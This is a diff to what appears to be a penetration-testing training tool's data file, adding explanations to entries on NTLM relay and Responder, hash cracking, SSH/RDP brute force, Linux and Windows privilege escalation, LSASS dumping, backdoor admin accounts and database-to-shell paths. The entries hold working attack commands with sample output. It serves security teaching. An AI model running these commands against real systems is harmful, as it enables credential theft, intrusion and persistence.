+      why: "On a Windows network, when a host cannot resolve a name the normal way it shouts for it over LLMNR, NBT-NS, and mDNS, and Responder answers those shouts, so a user mistyping a share name hands you their NetNTLMv2 hash to crack. It runs entirely on your box and is passive, you catch authentication that comes to you, you send none. Reach for it with a foothold on the segment and no creds yet; it is often the first domain credential you get.",
       signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
       teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is PASSIVE: it only catches authentication that happens to come your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
       steps: [
@@ -1092,6 +1178,7 @@
       ],
     },
     'ntlm-relay-attack': {
+      why: "When SMB signing is not required you do not have to crack captured authentication, you can relay it live to another host and act as that user: dump its SAM, run a command, add a computer. Pair it with coercion or Responder to generate the auth. Reach for it when the NTLM Relay finding says signing is off. It beats cracking because you never need the password at all, so it works even against strong ones.",
       signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
       teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it, but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
       steps: [
@@ -1106,6 +1193,7 @@
       ],
     },
     'mitm6-ipv6-takeover': {
+      why: "Windows prefers IPv6 and constantly asks for a DHCPv6 lease that usually goes unanswered, so mitm6 answers as a rogue DHCPv6 and DNS server, becomes the victim's DNS, and feeds the resulting authentication into a relay. Reach for it on a dual-stack Windows network when plain Responder is quiet. It is powerful but noisy and disruptive, so understand the blast radius before you run it on anything you care about.",
       signal: '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
       teach: 'mitm6 runs on your box and abuses Windows\' preference for IPv6: it answers the DHCPv6 nobody configured, becomes the victim\'s DNS, and points WPAD at you, then ntlmrelayx relays the auth that follows to LDAP. It is not passive, but it does wait for a Windows host to renew (often a reboot or logon), so pair it with the relay and give it time.',
       steps: [
@@ -1121,6 +1209,7 @@
       ],
     },
     'crack-identify': {
+      why: "Spending two seconds to identify a hash format saves an hour of cracking it with the wrong mode. The leading marker ($krb5tgs$, $DCC2$, $6$) or the length and character set tells you the algorithm and the exact hashcat mode number. Do this before every crack. It is the cheapest insurance in the whole workflow, because a wrong mode number means hashcat either errors out or silently never matches.",
       cmd: 'nth -f hashes.txt', tool: 'name-that-hash',
       output: [
         '$krb5tgs$23$...',
@@ -1131,6 +1220,7 @@
       teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm, identify first, always.',
     },
     'crack-kerberoast': {
+      why: "Service accounts are the soft target of Active Directory: their passwords are set by humans, rarely rotated, and any domain user can request a crackable ticket for them. A cracked $krb5tgs$ hash hands you that service account's plaintext, which often has elevated rights. Reach for it after roasting, run it offline, and if rockyou does not crack it the account probably has a strong password, so move on rather than grinding.",
       cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '$krb5tgs$23$*svc_sql$ACME.INTERNAL$...:3f2a...:Summer2024!',
@@ -1140,6 +1230,7 @@
       teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you crack it offline at full speed with no lockout. "Cracked" means you now hold that account\'s cleartext password.',
     },
     'crack-asrep-offline': {
+      why: "An account configured without Kerberos pre-authentication lets anyone request a chunk of ciphertext encrypted with that user's password, with no credentials at all, and that $krb5asrep$ hash cracks offline to their plaintext. Reach for it after AS-REP roasting surfaces such a user. It is pure upside: finding even one pre-auth-disabled account can be your entire foothold into the domain.",
       cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2...:Welcome2024!',
@@ -1149,6 +1240,7 @@
       teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" turns the roast into a login, a real domain credential.',
     },
     'crack-ntlm': {
+      why: "An NTLM hash pulled from the SAM or NTDS may crack to a plaintext that logs in here or, more usefully, is reused on another host. Reach for it after a dump, but remember you do not always need to crack: NTLM can be passed directly. Crack it when you specifically need the cleartext, for a service that will not take a hash (RDP, a web login, SSH), or to prove password reuse.",
       cmd: 'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '31d6cfe0d16ae931b73c59d7e0c089c0:(empty)',
@@ -1159,6 +1251,7 @@
       teach: 'A dumped NTLM hash (mode 1000) cracks offline. You do not always need to (NTLM can be passed directly), but a recovered cleartext password is reusable on services that will not take a hash (RDP, web, SSH).',
     },
     'crack-netntlmv2': {
+      why: "A NetNTLMv2 hash caught by Responder or a relay differs from an NT hash in one crucial way: it cannot be passed, only cracked or relayed. So if you are not relaying, cracking is the only route, and a cracked password becomes a real login wherever that account is valid. Reach for it after a capture, and strip duplicates first, because Responder appends on every run.",
       cmd: 'hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
@@ -1168,6 +1261,7 @@
       teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. A NetNTLMv2 hash CANNOT be passed (only cracked or relayed), so recover the password and it becomes a real login wherever that account is valid.',
     },
     'crack-shadow': {
+      why: "A /etc/shadow entry you managed to read, through a SUID binary, a backup, or a misconfiguration, cracks offline to a local password that is very often reused for sudo or on another box. Reach for it whenever you get shadow read access. The crack is the easy part; the real value is testing that recovered password everywhere, because people reuse passwords constantly.",
       cmd: 'hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         'root:$6$xyz$...:toor123',
@@ -1177,6 +1271,7 @@
       teach: 'A $6$ hash from /etc/shadow is sha512crypt (mode 1800), slow by design, so lean on a good wordlist and rules. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
     },
     'crack-archive': {
+      why: "A password-protected backup or export sitting in your loot almost always hides config files or credentials, which is exactly why someone locked it. Extract its hash with the matching *2john (zip2john, rar2john), crack it offline, then unpack it and read what is inside. Reach for it whenever you find a locked archive; it is a self-contained side quest that frequently hands you the next credential.",
       cmd: 'zip2john backup.zip > archive.hash && hashcat -m 17200 archive.hash rockyou.txt', tool: 'zip2john',
       output: [
         'backup.zip/config.bak:$pkzip2$...:hunter2',
@@ -1186,6 +1281,7 @@
       teach: 'A password-protected archive you looted is just another crackable hash, zip2john/office2john extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
     },
     'online-brute-ssh': {
+      why: "Online brute-forcing is the loud, risky, last-resort option: reach for it only when SSH is reachable, you have an enumerated username list, and the quieter paths (loot, reuse, keys) are exhausted. It is noisy and can lock accounts, so it never runs on its own and the wordlist stays targeted. Prefer a short list of likely passwords against known-real users over a giant list against guesses.",
       cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://10.10.10.10', tool: 'hydra',
       output: [
         '[DATA] attacking ssh://10.10.10.10:22/',
@@ -1196,6 +1292,7 @@
       teach: 'When you have a real username but no password, a measured online brute against SSH can find a weak one. Keep the wordlist small and the rate sane (-t 4), lab accounts lock out too, and a found pair is an instant shell.',
     },
     'online-brute-ftp': {
+      why: "FTP with no known credential is a classic hydra target, and a recovered FTP login frequently reuses onto SSH or the web, so the payoff reaches past FTP itself. Still, it is online brute-forcing: loud and lockout-prone, so treat it as a fallback after anonymous login and loot have failed. Keep the user list tight and the password list sensible; blasting rockyou at it is rarely the move.",
       cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ftp://10.10.10.10', tool: 'hydra',
       output: [
         '[DATA] attacking ftp://10.10.10.10:21/',
@@ -1205,6 +1302,7 @@
       teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords, and always test anonymous first, it is free. A hit gives you file access, and often the files hold the next credential.',
     },
     'online-brute-rdp': {
+      why: "A reachable RDP service with no credential can be sprayed, but RDP lockout policies bite hard, so go slow and spray one or two likely passwords across users rather than many passwords at one account. Reach for it only after the quieter options are gone. A valid RDP login is a full interactive desktop, which is the temptation, but the lockout risk makes this a careful, late-stage move.",
       cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 1 rdp://10.10.10.10', tool: 'hydra',
       output: [
         '[DATA] attacking rdp://10.10.10.10:3389/',
@@ -1214,6 +1312,7 @@
       teach: 'A weak RDP password is an interactive desktop. Brute it only with a real username and a short list at -t 1, RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
     },
     'crack-mscache2': {
+      why: "Domain Cached Credentials v2 ($DCC2$) are what a laptop stores so a domain user can still log in when the DC is unreachable. They are deliberately slow to crack and, unlike NT hashes, cannot be passed, so cracking is the only path. Reach for them when you dump a workstation's secrets and find cached logons. A weak one still falls, and the plaintext is a genuine domain credential, worth the long crack.",
       cmd: 'hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
@@ -1225,6 +1324,7 @@
 
     // ============================ LINUX PRIVESC ============================
     'linux-enum': {
+      why: "You escalate by finding the one thing that is wrong, not by recalling techniques, so this is where every Linux privesc starts. Run a scanner like linpeas for coverage, but read its output hunting for the single outlier: an odd SUID bit, a writable path in root's PATH, a password in a config. Do it the moment you land. The scanner finds a hundred things; your job is to spot the one that matters, so read with a question, not a checklist.",
       signal: '    (ALL) NOPASSWD: /usr/bin/find',
       teach: 'linpeas runs every local privesc check at once and colour-codes the leads, but it is not on the target, so you serve it from your box and pipe it straight into a shell (no file touches disk). A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
       steps: [
@@ -1239,6 +1339,7 @@
       ],
     },
     'sudo-abuse': {
+      why: "`sudo -l` is the first command to run on any Linux foothold, because the answer is so often an instant win: a NOPASSWD entry on a binary GTFOBins knows how to escape (vim, find, awk, python) is root in one line. Reach for it immediately after enumeration. The pattern to learn is \"what can this binary be made to do beyond its intended job\", because that same idea reappears with SUID and capabilities.",
       cmd: 'sudo -l', tool: 'sh',
       output: [
         'Matching Defaults entries for www-data on target:',
@@ -1250,6 +1351,7 @@
       teach: 'sudo -l lists what you may run as another user without a password. NOPASSWD on a GTFOBins binary like find is a direct road to root (find . -exec /bin/sh \\; ). It is the first command to run on any Linux foothold.',
     },
     'writable-passwd': {
+      why: "A world-writable /etc/passwd is a direct, exploit-free path to root: append a line for an account whose password hash you generated on your own box, then su to it. It turns up in labs more than it should. Reach for it whenever enumeration flags /etc/passwd as writable. There is no payload and nothing to crack, which makes it one of the cleanest escalations there is, just back up the file first.",
       cmd: 'ls -la /etc/passwd', tool: 'sh',
       output: [
         '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
@@ -1258,6 +1360,7 @@
       teach: 'A world-writable /etc/passwd lets you add a root-UID user with a password hash you control (openssl passwd), then su to it. A single misconfigured permission bit is a direct path to root.',
     },
     'nfs-squash': {
+      why: "An NFS share exported with no_root_squash trusts your remote root, so you mount it, drop a root-owned SUID shell on it from your side, then execute that shell on the target as root. Reach for it when enumeration or an NFS scan shows that export option. It lives half on your box and half on the target: you make the SUID binary as root locally and run it remotely, and understanding that split is the key to not fumbling it.",
       cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
       output: [
         'Export list for 10.10.10.10:',
@@ -1267,6 +1370,7 @@
       teach: 'no_root_squash on an NFS export means files you create as root on your own machine stay root-owned on the target. Mount it, drop a root-owned SUID shell, and run it on the box, a classic NFS privesc. Check the export options first.',
     },
     'lxc-lxd-escape': {
+      why: "Membership in the lxd group is root without a password, and one of the most common intended paths on lab boxes: lxd lets you start a privileged container, mount the host filesystem inside it, and read or write anything as root. Reach for it the instant `id` shows the lxd group. The win is in who you already are, which is why checking your group memberships is the very first thing to do.",
       cmd: 'id', tool: 'sh',
       output: [
         'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
@@ -1275,6 +1379,7 @@
       teach: 'Membership in the lxd group is root-equivalent: you launch a privileged container that mounts the host filesystem and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one, always check your groups.',
     },
     'docker-socket': {
+      why: "A writable /var/run/docker.sock, or the docker group, is root on the host by design: launch a container with the host filesystem attached and chroot into it. It is the lxd escape with a different daemon. Reach for it when the socket is writable or `id` shows the docker group. The idea that generalises: any group or socket that controls a root daemon is effectively root, so always check what your groups can talk to.",
       cmd: 'ls -la /var/run/docker.sock && id', tool: 'sh',
       output: [
         'srw-rw---- 1 root docker 0 Jan 1 10:00 /var/run/docker.sock',
@@ -1284,6 +1389,7 @@
       teach: 'Membership in the docker group is root-equivalent: you can start a container that mounts the host\'s / and read or write anything as root. The docker socket being reachable is the whole game.',
     },
     'suid-gtfobins': {
+      why: "A SUID binary runs as its owner, usually root, so the question on every Linux box is whether there is a SUID binary that should not be one. The stock ones (su, mount, passwd) are expected noise; what you want is the outlier, a custom or out-of-place binary that GTFOBins has a shell-escape for. Reach for it during enumeration, and train your eye to find the odd one out, because that single misplaced SUID bit is a classic root.",
       cmd: 'find / -perm -4000 -type f 2>/dev/null', tool: 'sh',
       output: [
         '/usr/bin/passwd',
@@ -1294,6 +1400,7 @@
       teach: 'A SUID binary runs as its owner (often root) no matter who starts it. Cross the list against GTFOBins, /usr/bin/find with the SUID bit is a one-liner to a root shell. Ignore the expected ones (passwd, sudo); hunt the unusual.',
     },
     'pspy-monitor': {
+      why: "Root runs scheduled jobs that never appear in your crontab, and pspy watches process creation to reveal them without needing root. The gold is a script in a writable path that root runs on a timer, or a command leaking a credential on its arguments. Reach for it when enumeration hints that \"something runs periodically\" but you cannot see what. It is patience as a technique: let it watch, and the scheduled root job shows itself.",
       signal: '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
       teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab, but it is a binary you have to get onto the box first. Serve it from your box, pull it down and make it executable, then run it. A root job (UID=0) running every 2 minutes is a privesc lead: if you can write the script it runs, you run code as root.',
       steps: [
@@ -1306,6 +1413,7 @@
       ],
     },
     'cron-abuse': {
+      why: "Two classic root-via-cron bugs: a root cron job that runs a script you can write (edit it, wait, become root), and a root job running tar or rsync with a wildcard in a directory you control (you plant filenames that become command-line options). Reach for it when pspy or enumeration shows a root job touching anything you can write. The wildcard-injection trick especially is worth learning, because it looks harmless and is anything but.",
       cmd: 'cat /etc/crontab', tool: 'sh',
       output: [
         'SHELL=/bin/sh',
@@ -1316,6 +1424,7 @@
       teach: 'A cron job that runs as root on a script you can write is a direct privesc: append a reverse shell or a SUID copy of bash, wait for the next run, and you are root. Check /etc/crontab, /etc/cron.*, and tar-wildcard jobs.',
     },
     'capabilities': {
+      why: "Linux capabilities slice root's power into pieces, and a misplaced one is a shortcut to root: cap_setuid on python is an instant root shell, cap_dac_read_search reads any file including shadow, cap_sys_admin is nearly root outright. Reach for it during enumeration with getcap. It is the same \"what can this binary really do\" reasoning as SUID and sudo, just expressed through capabilities, so check it in the same pass.",
       cmd: 'getcap -r / 2>/dev/null', tool: 'sh',
       output: [
         '/usr/bin/python3.8 = cap_setuid+ep',
@@ -1325,6 +1434,7 @@
       teach: 'File capabilities grant slices of root power without the SUID bit. cap_setuid+ep on python means it can set its UID to 0, one line (os.setuid(0)) and you are root. Always run getcap -r / on a Linux box.',
     },
     'linux-loot-hunt': {
+      why: "Before the clever techniques, just go looking, because credentials sitting in plain sight escalate more boxes than any exploit: shell history, config files with passwords, other users' readable home directories, backups under /opt and /var, mail spools. Reach for it right after your enumeration sweep. The mindset is \"where would a lazy admin leave a password\", and the answer is usually a file you can already read.",
       cmd: 'grep -rils "password" /var/www /home 2>/dev/null', tool: 'sh',
       output: [
         '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
@@ -1334,6 +1444,7 @@
       teach: 'Once you have a shell, loot before you escalate. Config files, shell history, and web roots leak passwords constantly, and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for password, secret, and key.',
     },
     'linux-persistence': {
+      why: "Once you are root, persistence buys a way back in that survives password resets and reboots, which matters in long engagements and when an exam permits re-entry. The low-profile options: your SSH key in root's authorized_keys, a cron job, a SUID backdoor. Reach for it only after you have rooted the box and need durable access. On a short lab it is optional; as a habit and a report note, it is still worth understanding.",
       signal: 'root@target:~#',
       teach: 'Labs revert and shells die. Adding your public key to authorized_keys gives you a stable, password-free way back in, far better than re-exploiting each time. On a real engagement, persistence is scoped and documented.',
       steps: [
@@ -1349,6 +1460,7 @@
 
     // ============================ WINDOWS PRIVESC ============================
     'windows-enum': {
+      why: "Same principle as Linux: let winpeas give you coverage, then let your own judgment pick the one finding that matters. On lab Windows boxes the usual winners are a misconfigured service, a credential left in a file or the registry, or an abusable privilege. Reach for it the moment you land. The output is long and mostly noise, so read it hunting for the outlier, not top to bottom.",
       signal: 'SeImpersonatePrivilege: Enabled',
       teach: 'Start with the built-in whoami /priv (instant, nothing to stage), then run the deep sweep with winPEAS, which is an .exe you must get onto the box first. Serve it from your box and pull it over with certutil, then run it. SeImpersonate Enabled on a service account means a "potato" exploit gets you SYSTEM.',
       steps: [
@@ -1368,6 +1480,7 @@
       ],
     },
     'seimpersonate': {
+      why: "Service accounts (IIS, MSSQL) almost always hold SeImpersonatePrivilege, and that privilege is a straight line to SYSTEM: the \"potato\" exploits trick a privileged service into authenticating, then impersonate its token. Reach for it the instant `whoami /priv` shows SeImpersonate enabled. It is the most reliable Windows service-account escalation there is, so checking your privileges is the first thing to do after a web or database foothold.",
       signal: 'nt authority\\system',
       teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it, and you are SYSTEM.',
       steps: [
@@ -1382,6 +1495,7 @@
       ],
     },
     'unquoted-service-path': {
+      why: "When a service's path has spaces and no quotes (C:\\Program Files\\My App\\svc.exe), Windows tries C:\\Program.exe first, then C:\\Program Files\\My.exe, so if you can write to one of those spots you choose what runs as SYSTEM. Reach for it when enumeration lists an unquoted path you can write into. It is a tidy classic, the catch is needing write access to the right folder, so verify that before building the payload.",
       cmd: 'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\"', tool: 'sh',
       output: [
         'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
@@ -1390,6 +1504,7 @@
       teach: 'An unquoted service path with spaces lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If you can write to one of those directories, drop your payload there and the service runs it, often as SYSTEM.',
     },
     'weak-service-permissions': {
+      why: "If you can change a service's configuration or overwrite its executable, you decide what runs as SYSTEM the next time it starts, by pointing it at your own binary. accesschk finds services whose ACLs you can write. Reach for it when enumeration flags a modifiable service. Note you usually need to trigger a restart (or wait for a reboot), so part of the exploit is getting the service to start again.",
       signal: '        SERVICE_ALL_ACCESS',
       teach: 'accesschk (a Sysinternals .exe) finds services whose ACLs you can write, but you have to stage it first: serve it from your box, pull it over with certutil, then run it. SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command and restart it, code execution as the service account, usually SYSTEM.',
       steps: [
@@ -1403,6 +1518,7 @@
       ],
     },
     'alwaysinstallelevated': {
+      why: "When AlwaysInstallElevated is set in both HKLM and HKCU, any MSI you run installs with SYSTEM rights, so you build an MSI that adds an admin or runs your command and launch it. Reach for it when enumeration shows both registry keys set to 1, both are required, one alone does nothing. It is a quick, reliable win when present, which is why winpeas checks for it specifically.",
       cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tool: 'sh',
       output: [
         'HKLM\\...\\Installer',
@@ -1413,6 +1529,7 @@
       teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI (msfvenom -f msi), run msiexec, and you escalate, a pure misconfiguration, no exploit needed.',
     },
     'dpapi-secrets': {
+      why: "Windows encrypts saved credentials (RDP, scheduled tasks, browser passwords) under DPAPI masterkeys, which are themselves protected by the user's password hash, so once you have that user you can decrypt their stored secrets. Reach for it after you own a user account and suspect saved credentials. It turns \"I am this user\" into \"here is everything this user saved\", which often includes a path to a more privileged account.",
       cmd: "impacket-dpapi credential -file C:\\Users\\dev\\AppData\\...\\Credentials\\A1B2 -key 0x...", tool: 'impacket-dpapi',
       output: [
         '[CREDENTIAL]',
@@ -1424,6 +1541,7 @@
       teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials, often for other systems the user accessed.',
     },
     'stored-credentials': {
+      why: "Windows hoards credentials in predictable places: Credential Manager, autologon registry entries, unattend and sysprep answer files, saved .rdp files, browser vaults, mRemoteNG configs. Reach for it on every Windows foothold, because a found credential beats any exploit and frequently belongs to a more privileged account. The skill is knowing the dozen places to look, so run through them deliberately rather than hoping winpeas catches them all.",
       cmd: 'cmdkey /list', tool: 'sh',
       output: [
         'Currently stored credentials:',
@@ -1434,6 +1552,7 @@
       teach: 'Windows caches credentials for convenience. cmdkey /list shows stored logins you can reuse with runas /savecred, sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
     },
     'windows-old-hives': {
+      why: "A leftover C:\\windows.old from an in-place upgrade, or any saved SAM/SYSTEM hive, holds old local-account hashes, and the local Administrator hash is frequently still valid. Pull the hives, dump them offline with secretsdump, then crack or pass the hash. Reach for it when you find windows.old or readable hive backups. It is a clean path to local admin that bypasses touching LSASS at all.",
       cmd: 'dir C:\\Windows.old\\Windows\\System32\\config', tool: 'sh',
       output: [
         'Directory of C:\\Windows.old\\Windows\\System32\\config',
@@ -1444,6 +1563,7 @@
       teach: 'A Windows.old folder from an in-place upgrade keeps old registry hives (SAM and SYSTEM) that a low-priv user can often read. Pull them and dump offline (secretsdump) for the local Administrator hash, then pass it.',
     },
     'wesng-patch-gaps': {
+      why: "Older Windows hosts (2008, 2012, 7) are often escalated by a missing kernel patch rather than a misconfiguration, and wesng maps the gaps: feed it `systeminfo` and it lists the missing patches with matching exploits. Reach for it when the box is old and the misconfiguration checks came up empty. Treat its output as candidates to verify, because a kernel exploit can crash the box, so weigh the risk before firing one on something you need stable.",
       cmd: 'systeminfo', tool: 'sh',
       output: [
         'OS Name:          Microsoft Windows Server 2016 Standard',
@@ -1454,6 +1574,7 @@
       teach: 'systeminfo gives the exact build and installed hotfixes. Feed it to wesng (Windows Exploit Suggester) and it lists the kernel exploits the box is missing. Confirm the build and architecture before running one, a wrong kernel exploit bluescreens the target.',
     },
     'windows-persistence': {
+      why: "With admin or SYSTEM, persistence leaves a route back: a local admin account you control, a scheduled task, or a Run key. Labs rarely need it, but long engagements do, and it is a legitimate report note on real work. Reach for it only after you hold privilege and need durable access. Like the Linux case, it is optional on a short box but worth understanding as a technique and as something defenders watch for.",
       cmd: "net user obol_svc 'Str0ng!Passw0rd' /add && net localgroup administrators obol_svc /add", tool: 'sh',
       output: [
         'The command completed successfully.',
@@ -1463,6 +1584,7 @@
       teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; note what you create so you can remove it.',
     },
     'lsass-dump-onbox': {
+      why: "LSASS holds the credentials of every user currently logged on, so with admin or SYSTEM you dump its memory and parse out hashes, tickets, and sometimes plaintext. The built-in comsvcs.dll method needs nothing uploaded; ship the .dmp to Kali and parse it there to keep noise down. Reach for it once you have admin and want to harvest more credentials, especially on a box where a domain admin may have logged in.",
       cmd: 'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full', tool: 'cmd',
       output: [
         '# dump written; parse offline with pypykatz:',
@@ -1472,6 +1594,7 @@
       teach: 'LSASS holds the credentials of everyone logged in. With local admin you dump its memory and parse it offline (pypykatz) for NTLM hashes, including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
     },
     'defense-enum': {
+      why: "Before running anything loud on a Windows host, find out what is watching: PowerShell language mode, Defender's real-time state and its exclusion paths, any AppLocker policy. Reach for it first on any Windows foothold, because a Defender exclusion path is literally a folder where your tools will not be scanned, and the language mode tells you whether your PowerShell will even run. It is reconnaissance that shapes every later choice.",
       cmd: 'powershell -c "$ExecutionContext.SessionState.LanguageMode"', tool: 'powershell',
       output: [
         'ConstrainedLanguage',
@@ -1482,6 +1605,7 @@
 
     // ============================ DATABASES ============================
     'mysql-login': {
+      why: "A reachable MySQL frequently accepts a credential you already found, a blank root password, or reused creds, and a session in is the door to the schema and, more importantly, the application's own user and password tables. Reach for it whenever you have a MySQL port and any plausible credential. Getting in is usually the easy part; the value is what the application stored in its own tables.",
       cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT version();'", tool: 'mysql',
       output: [
         '+-------------------------+',
@@ -1494,6 +1618,7 @@
       teach: 'A successful MySQL login is a foothold of its own: from SQL you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first, it steers what is possible.',
     },
     'mysql-loot': {
+      why: "Applications keep their own user rows and password hashes in the database, so once you have a session, dumping the user tables yields crackable hashes and, very often, admin credentials that reuse elsewhere. Reach for it immediately after a MySQL login. This is where a database foothold becomes an account: the app's own password table is frequently the shortest path to a real login on the box or the domain.",
       cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT user,host,authentication_string FROM mysql.user;'", tool: 'mysql',
       output: [
         '+------------------+------+-------------------------------------------+',
@@ -1507,6 +1632,7 @@
       teach: 'Once you have a DB session, the mysql.user table holds every account\'s password hash (mode 300 for the *HEX form). Dump them and crack offline, database passwords are reused as system and domain passwords all the time.',
     },
     'mssql-login': {
+      why: "MSSQL commonly accepts a domain credential or the `sa` account, and an authenticated SQL prompt is the gateway to enumeration and, with enough privilege, to running OS commands. Reach for it when you see MSSQL and hold any credential, or suspect a weak `sa`. Unlike MySQL, MSSQL's real prize is command execution, so logging in is step one toward a Windows foothold, not the goal itself.",
       cmd: 'mssqlclient.py acme.internal/svc_sql:P@ssw0rd2023@10.10.10.10 -windows-auth', tool: 'mssqlclient.py',
       output: [
         '[*] Encryption required, switching to TLS',
@@ -1518,6 +1644,7 @@
       teach: 'The first thing to check on an MSSQL login is IS_SRVROLEMEMBER(\'sysadmin\'). A 1 means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
     },
     'mssql-xp-cmdshell': {
+      why: "A sysadmin-level MSSQL login can enable and call xp_cmdshell to run OS commands as the SQL service account, which is a direct Windows foothold, and that account very often carries SeImpersonatePrivilege for the next step to SYSTEM. Reach for it once you confirm sysadmin rights. It is one of the cleanest database-to-shell paths on Windows, so the moment you hold `sa`, this is the move.",
       cmd: "mssqlclient.py ...@10.10.10.10 -q \"EXEC xp_cmdshell 'whoami'\"", tool: 'mssqlclient.py',
       output: [
         'output',
@@ -1528,6 +1655,7 @@
       teach: 'With sysadmin on MSSQL you re-enable xp_cmdshell and run OS commands as the SQL service account. The whoami output confirms code execution, the database just became a shell. From here, grab a reverse shell.',
     },
     'postgres-login': {
+      why: "PostgreSQL may accept a default or reused credential, and a session opens database enumeration plus, on older versions, RCE through COPY FROM PROGRAM or large-object tricks. Reach for it when you see Postgres and have a plausible credential. Check the version, because the command-execution path depends on it: the same login is either \"just data\" or \"a shell\" depending on how old the server is.",
       cmd: "PGPASSWORD=postgres psql -h 10.10.10.10 -U postgres -c 'SELECT version();'", tool: 'psql',
       output: [
         '                         version',
@@ -1539,6 +1667,7 @@
       teach: 'A PostgreSQL session with the right role can read files and, via COPY ... FROM PROGRAM, run commands. As with any DB foothold, the version tells you which of those paths is open to you.',
     },
     'redis-enum': {
+      why: "An exposed Redis very often has no AUTH at all, so INFO and KEYS dump cached secrets for free, and a writable instance can be pushed to RCE by writing an SSH key or a webshell to disk. Reach for it the moment you see Redis open. First read what is cached (sessions and secrets live there), then, if it is writable and you know a path, escalate the write into code execution.",
       cmd: 'redis-cli -h 10.10.10.10 INFO server', tool: 'redis-cli',
       output: [
         '# Server',
@@ -1550,6 +1679,7 @@
       teach: 'An unauthenticated Redis answers INFO to anyone. Beyond the version, a writable Redis can be abused to drop an SSH key or a web shell (CONFIG SET dir / dbfilename), an open Redis on 6379 is frequently a direct foothold.',
     },
     'mongo-enum': {
+      why: "An exposed MongoDB with no auth lets you list databases and dump collections outright, which spills application data and any credentials stored in it. Reach for it whenever Mongo is open and unauthenticated. There is no injection or cracking involved, it is just reading what should have been locked down, so enumerate the collections and mine them for credentials and anything that unlocks the next step.",
       cmd: 'nmap -Pn -p 27017 --script mongodb-info,mongodb-databases 10.10.10.10', tool: 'nmap',
       output: [
         'PORT      STATE SERVICE',
@@ -1564,6 +1694,7 @@
 
     // ============================ SHELLS & TRANSFER ============================
     'ssh-key-login': {
